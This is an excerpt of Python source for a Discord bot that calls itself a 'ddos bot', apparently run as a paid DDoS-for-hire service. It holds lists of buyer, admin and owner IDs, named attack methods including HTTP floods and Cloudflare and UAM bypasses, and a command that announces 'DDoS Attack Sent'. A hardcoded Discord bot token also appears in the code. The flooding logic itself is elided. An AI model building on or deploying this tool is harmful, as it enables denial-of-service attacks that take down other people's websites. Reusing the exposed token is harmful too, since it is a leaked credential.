__author__ = 'K6T Official'
__version__ = '1.2'
__github__ = 'github.com/pbthong'
__license__ = 'GNU General Public License v3.0'
# K6T | Discord ddos bot v1.2 | K6T Official
#=====Import Module=====#
import os
try:
	import discord
...
buyers  = [921703766665883718]  #          
admins  = [921703766665883718]  #   ID users            
owners  = [920122047311540294]  #          
methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
year_now= datetime.datetime.now().strftime("%Y")     
token   = 'MTAxMzgyNzUxNzAyODc2MTcxMQ.Gt2ePI.kgKnn39HYxG0yqgnGUZC9PwltpNaBivpjRZbEU' # paste your token here
...
@bot.command()
async def help(ctx):
        embed = discord.Embed(title="K6T | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
        ...
        embed.set_footer(text = f"©{year_now} Copyright K6T Official")
        ...
        if method is None:
            ...
            await ctx.send(embed=embed)
                ...
                if method == 'HTTP-FLOOD':
                    embed = discord.Embed(title=f"K6T Network | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
